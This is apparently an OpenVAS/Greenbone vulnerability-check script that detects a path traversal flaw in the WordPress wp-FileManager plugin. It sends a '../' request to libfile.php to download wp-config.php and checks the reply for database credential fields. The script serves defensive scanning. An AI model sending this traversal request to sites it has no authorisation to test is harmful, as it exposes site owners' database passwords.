CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803492" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2013-04-17 17:30:46 +0530 (Wed, 17 Apr 2013)" );
	script_name( "WordPress wp-FileManager Plugin File Download Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/25440" );
	script_xref( name: "URL", value: "http://www.securelist.com/en/advisories/53421" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/wp-filemanager/changelog" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/wordpress-wp-filemanager-file-download" );
	script_xref( name: "URL", value: "http://security4you.net/blog/wordpress-wp-filemanager-local-file-download-vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to download and
  read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "WordPress wp-FileManager Plugin before 1.4.0" );
	script_tag( name: "insight", value: "The input passed via 'path' parameter to
  'wordpress/wp-content/plugins/wp-filemanager/incl/libfile.php' script is
  not properly validating '../'(dot dot) sequences before being returned
  to the user." );
	script_tag( name: "solution", value: "Update to version 1.4.0 or later." );
	script_tag( name: "summary", value: "This host is running WordPress with wp-FileManager plugin and is
  prone to file download vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/wp-filemanager/incl/libfile.php" + "?&path=../../&filename=wp-config.php&action=download";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "wp-config.php}", extra_check: make_list( "DB_NAME",
	 "DB_USER",
	 "DB_PASSWORD" ) )){
	security_message( port );
	exit( 0 );
}

